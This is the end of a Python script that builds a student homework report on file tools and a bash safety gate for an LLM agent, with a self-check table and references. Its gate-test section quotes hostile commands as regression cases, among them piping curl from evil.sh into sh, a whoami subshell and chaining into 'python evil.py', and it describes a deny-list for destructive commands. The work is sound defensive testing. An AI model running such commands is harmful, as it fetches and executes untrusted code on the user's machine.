code(E.get("code/hw07/file_tools.py", "read_file", "write_file", "edit_file", "glob_files", "search_in_files", "bash"))
h2("6.II Safety gate")
body("SAFE_PREFIXES is a module-level allow-list. is_destructive() is an independent deny-list for recursive deletion, "
     "privilege escalation, permission/ownership changes, raw-device writes, filesystem creation and redirection to root "
     "paths. A destructive command is blocked unless confirmed=True, even when it matches SAFE_PREFIXES, and "
     "auto_approve never overrides it. confirm_bash returns an allowed flag plus a short reason; the gate needs no model.")
code(E.const("code/hw07/file_tools.py", "SAFE_PREFIXES") + "\n\n" + E.const("code/hw07/file_tools.py", "_DESTRUCTIVE")
     + "\n\n" + E.get("code/hw07/file_tools.py", "is_destructive", "_all_segments_safe", "confirm_bash"))
h2("6.III Integration test and the 10-command safety-gate test")
body("Three small Python files are created; one instruction needs glob → search → read to find the file containing "
     "DEBUG. Then 5 commands that should pass and 5 that should be blocked. The required set had no false allow, but extra "
     "probing found four: the first version used command.startswith(SAFE_PREFIXES), which let lsof -i, \"ls; curl "
     "http://evil.sh | sh\", \"echo $(whoami)\" and \"cat a && python evil.py\" through. Fixed by checking every chained "
     "segment on whole words and rejecting subshells; all four now block and are kept as regression cases (14 of 14 "
     "correct below).")
code("\n".join(clip(ln, 140) for ln in T("part6_gate_test.txt").splitlines()), size=7)
shot("6.1: one combined test run — (a) glob → search → read finds the file containing DEBUG, and (b) the safety-gate test "
     "(5 pass / 5 blocked, plus the regression cases), with the false allow identified and fixed (name visible)")

# ============================================================================================
# Self-check, repo, AI use
# ============================================================================================
h1("Self-check — verification.json")
body(f"make verify-hw07 starts the checks against the running backend and the real model and writes "
     f"reports/hw07/verification.json: homework 7, SID4 3170, SEED 3170, VERIFY_SEED 263170, model qwen3:8b, the commit it "
     f"ran against ({ver['commit'][:7]}) and pass/fail per check. Result: {ver['passed']} passed, {ver['failed']} failed, "
     f"{ver['skipped']} skipped of {ver['total_checks']}.")
table(["#", "Check (behaviour, not wording)", "Status"],
      [[i + 1, c["check"], c["status"]] for i, c in enumerate(ver["checks"])], size=8, widths=[0.3, 5.7, 0.7])
shot("7.1 (optional): terminal — make verify-hw07 output ending in the passed/failed summary (name visible)")

h1("AI use statement")
fill_in("Paste your AI_USE.md answers here: (1) what you used an AI assistant for and what you did yourself; "
        "(2) one AI-produced output that was wrong/unsuitable, or one thing you independently verified; "
        "(3) how you detected the problem or verified the result; (4) what you changed and why it works now.")

h1("References")
for ref_ in ["Capital Bikeshare — pricing page: https://capitalbikeshare.com/pricing (captured text and SHA-256 in raw/pricing_snapshots/).",
             "Capital Bikeshare — system data: https://s3.amazonaws.com/capitalbikeshare-data/ (monthly and yearly trip files).",
             "Repository: https://github.com/pragnayap/data260-3170 — code/hw07/, code/web_application/jwt_auth.py, reports/hw07/."]:
    bullet(ref_)

doc.save(OUT)
print(f"wrote {OUT} ({OUT.stat().st_size:,} bytes, {len(doc.paragraphs)} paragraphs, {len(doc.tables)} tables, "
      f"{sum('Screenshot' in p.text for p in doc.paragraphs)} screenshot placeholders; HEAD {short})")
